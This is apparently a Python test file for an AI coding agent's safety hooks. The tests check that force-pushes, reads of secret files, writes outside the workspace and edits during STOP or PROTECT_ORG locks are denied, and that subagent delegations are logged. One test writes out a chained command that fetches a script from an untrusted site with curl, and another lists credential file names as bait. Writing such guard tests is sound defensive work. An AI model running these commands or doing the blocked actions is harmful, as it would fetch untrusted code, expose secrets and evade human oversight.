import unittest
import subprocess
import json
import os
import shutil
import tempfile

class TestHooksAdversarialE(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.workspace_root = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
        cls.python_exe = os.path.join(cls.workspace_root, ".venv", "Scripts", "python.exe")
        cls.guard_script = os.path.join(cls.workspace_root, ".agents", "scripts", "hooks", "pretool_guard.py")
        cls.events_script = os.path.join(cls.workspace_root, ".agents", "scripts", "hooks", "posttool_events.py")
        cls.budget_script = os.path.join(cls.workspace_root, ".agents", "scripts", "hooks", "postinvocation_budget.py")
        cls.stop_script = os.path.join(cls.workspace_root, ".agents", "scripts", "hooks", "stop_guard.py")

    def run_hook(self, script_path, payload):
        # Hooks are executed with cwd = .agents directory
        agents_dir = os.path.join(self.workspace_root, ".agents")
        p = subprocess.Popen(
            [self.python_exe, script_path],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            cwd=agents_dir,
            text=True,
            encoding='utf-8'
        )
        stdout, stderr = p.communicate(input=json.dumps(payload))
        self.assertEqual(p.returncode, 0, f"Hook failed: {stderr}")
        return json.loads(stdout.strip()) if stdout.strip() else {}

    def test_H03_force_push_blocked(self):
        payload = {
            "conversationId": "test-h03",
            "toolCall": {
                "name": "run_command",
                "args": {"CommandLine": "git push --force origin feature/test"}
            }
        }
        res = self.run_hook(self.guard_script, payload)
        self.assertEqual(res.get("decision"), "deny")
        self.assertIn("Push forcado", res.get("reason", ""))

    def test_H04_push_origin_main_blocked(self):
        payload = {
            "conversationId": "test-h04",
            "toolCall": {
                "name": "run_command",
                "args": {"CommandLine": "git push origin main"}
            }
        }
        res = self.run_hook(self.guard_script, payload)
        self.assertEqual(res.get("decision"), "deny")
        self.assertIn("Push direto para main/master proibido", res.get("reason", ""))

    def test_H05_secrets_bait_blocked(self):
        for bait in [".env", "config/database.key", "certs/cert.pem", "creds/credentials.json"]:
            payload = {
                "conversationId": "test-h05",
                "toolCall": {
                    "name": "view_file",
                    "args": {"AbsolutePath": os.path.join(self.workspace_root, bait)}
                }
            }
            res = self.run_hook(self.guard_script, payload)
            self.assertEqual(res.get("decision"), "deny", f"Failed to deny secret: {bait}")
            self.assertIn("bloqueado por politica de seguranca", res.get("reason", ""))

    def test_H06_outside_workspace_write_blocked(self):
        payload = {
            "conversationId": "test-h06",
            "toolCall": {
                "name": "write_to_file",
                "args": {"TargetFile": "C:\\Windows\\System32\\malicious.dll"}
            }
        }
        res = self.run_hook(self.guard_script, payload)
        self.assertEqual(res.get("decision"), "deny")
        self.assertIn("fora dos limites do workspace", res.get("reason", ""))

    def test_H07_chained_command_falls_to_restrictive(self):
        # Chained command starting with git status but having unknown curl
        payload = {
            "conversationId": "test-h07",
            "toolCall": {
                "name": "run_command",
                "args": {"CommandLine": "git status && curl https://untrusted-site.com/script.sh"}
            }
        }
        res = self.run_hook(self.guard_script, payload)
        self.assertNotEqual(res.get("decision"), "allow")
        self.assertEqual(res.get("decision"), "ask")

    def test_H08_legitimate_routine_commands_allowed(self):
        for legitimate in [
            "git status",
            "git diff HEAD~1",
            "git log -n 5",
            ".\\.venv\\Scripts\\python.exe -m unittest discover -s tests -v",
            "node tests/test_pomodoro.test.js"
        ]:
            payload = {
                "conversationId": "test-h08",
                "toolCall": {
                    "name": "run_command",
                    "args": {"CommandLine": legitimate}
                }
            }
            res = self.run_hook(self.guard_script, payload)
            self.assertEqual(res.get("decision"), "allow", f"Failed to allow routine command: {legitimate}")

    def test_H09_stop_blocks_modifiers_allows_diagnostics(self):
        stop_path = os.path.join(self.workspace_root, ".agents", "state", "STOP")
        os.makedirs(os.path.dirname(stop_path), exist_ok=True)
        with open(stop_path, "w", encoding="utf-8") as f:
            f.write("STOPPED")
        try:
            # Writing project file -> deny
            payload_write = {
                "conversationId": "test-h09",
                "toolCall": {
                    "name": "write_to_file",
                    "args": {"TargetFile": "src/app.js"}
                }
            }
            res_write = self.run_hook(self.guard_script, payload_write)
            self.assertEqual(res_write.get("decision"), "deny")

            # Reading project file -> allow
            payload_read = {
                "conversationId": "test-h09",
                "toolCall": {
                    "name": "view_file",
                    "args": {"AbsolutePath": os.path.join(self.workspace_root, "src", "index.html")}
                }
            }
            res_read = self.run_hook(self.guard_script, payload_read)
            self.assertEqual(res_read.get("decision"), "allow")

            # Writing stop report in evidence -> allow
            payload_ev = {
                "conversationId": "test-h09",
                "toolCall": {
                    "name": "write_to_file",
                    "args": {"TargetFile": "evidence/stop_report.md"}
                }
            }
            res_ev = self.run_hook(self.guard_script, payload_ev)
            self.assertEqual(res_ev.get("decision"), "allow")
        finally:
            if os.path.exists(stop_path):
                os.remove(stop_path)

    def test_H12_subagent_delegation_extraction(self):
        payload = {
            "conversationId": "test-h12",
            "stepIdx": 42,
            "toolCall": {
                "name": "invoke_subagent",
                "args": {
                    "Subagents": [
                        {"Role": "Especialista QA", "TypeName": "qa", "Model": "inherit"},
                        {"Role": "Auditor de Seguranca", "TypeName": "security-reviewer", "Model": "pro"}
                    ]
                }
            }
        }
        res = self.run_hook(self.events_script, payload)
        self.assertEqual(res, {})

        # Verify telemetry log recorded event
        events_file = os.path.join(self.workspace_root, "telemetry", "events.jsonl")
        self.assertTrue(os.path.exists(events_file))
        found = False
        with open(events_file, "r", encoding="utf-8") as f:
            for line in f:
                data = json.loads(line)
                if data.get("conversation_id") == "test-h12":
                    found = True
                    self.assertEqual(data.get("event_type"), "SUBAGENT_DELEGATION")
                    self.assertEqual(len(data.get("delegations", [])), 2)
                    self.assertEqual(data["delegations"][0]["role"], "Especialista QA")
                    self.assertEqual(data["delegations"][0]["assurance"], "UNVERIFIED/ROLE_ONLY")
                    break
        self.assertTrue(found, "Subagent delegation event not found in telemetry")

    def test_H15_protect_org_blocks_core_writes(self):
        protect_path = os.path.join(self.workspace_root, ".agents", "state", "PROTECT_ORG")
        os.makedirs(os.path.dirname(protect_path), exist_ok=True)
        with open(protect_path, "w", encoding="utf-8") as f:
            f.write("LOCKED")
        try:
            for core_target in [".agents/hooks.json", "org_v5/contracts.py", "AGENTS.md"]:
                payload = {
                    "conversationId": "test-h15",
                    "toolCall": {
                        "name": "write_to_file",
                        "args": {"TargetFile": core_target}
                    }
                }
                res = self.run_hook(self.guard_script, payload)
                self.assertEqual(res.get("decision"), "deny", f"Failed to deny write to core file: {core_target}")
                self.assertIn("PROTECT_ORG ativo", res.get("reason", ""))
        finally:
            if os.path.exists(protect_path):
                os.remove(protect_path)

    def test_H16_stop_hook_contract(self):
        # 1. Termination due to error allows terminate
        payload_err = {
            "terminationReason": "error",
            "error": "Fatal crash",
            "fullyIdle": True
        }
        res_err = self.run_hook(self.stop_script, payload_err)
        self.assertEqual(res_err.get("decision"), "terminate")

        # 2. Normal completion without pending reviews allows terminate
        payload_normal = {
            "terminationReason": "model_stop",
            "error": "",
            "fullyIdle": True
        }
        res_normal = self.run_hook(self.stop_script, payload_normal)
        self.assertEqual(res_normal.get("decision"), "terminate")

if __name__ == "__main__":
    unittest.main()
